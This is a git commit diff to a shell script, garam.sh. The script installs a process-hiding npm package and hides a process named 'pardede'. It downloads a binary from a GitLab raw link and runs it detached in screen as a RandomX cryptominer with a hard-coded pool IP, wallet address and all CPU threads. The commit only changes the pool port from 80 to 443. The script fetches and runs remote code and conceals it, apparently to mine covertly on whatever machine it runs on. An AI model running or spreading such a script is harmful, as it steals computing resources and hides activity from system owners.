e086d08ef2169918340dde5ceff108356c2a7797
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-09 02:16:05 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -8,6 +8,6 @@ apt-get install -y nodejs
 sudo apt install npm =y
 sudo npm i -g node-process-hider && sudo ph add pardede
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
-screen -dms run ./pardede -a rx/0 -o 47.89.195.104:80 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
+screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo A-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
 EOF
 screen -r
